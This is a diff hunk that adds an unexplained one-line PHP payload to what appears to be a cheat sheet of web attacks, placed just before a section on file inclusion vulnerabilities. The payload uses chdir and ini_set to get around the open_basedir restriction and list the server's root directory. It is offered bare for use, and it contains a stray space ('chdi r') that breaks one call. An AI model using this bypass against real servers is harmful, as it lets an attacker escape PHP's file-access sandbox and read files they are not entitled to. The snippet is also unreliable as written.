@@ -411,6 +411,14 @@ function dump($s){
 
 
 
+#### ???
+
+```php
+mkdir('/tmp/fuck');chdir('/tmp/fuck/');ini_set('open_basedir','..');chdir('..');chdir('..');chdi r('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/'));
+```
+
+
+
 
 
 ## 文件包含漏洞
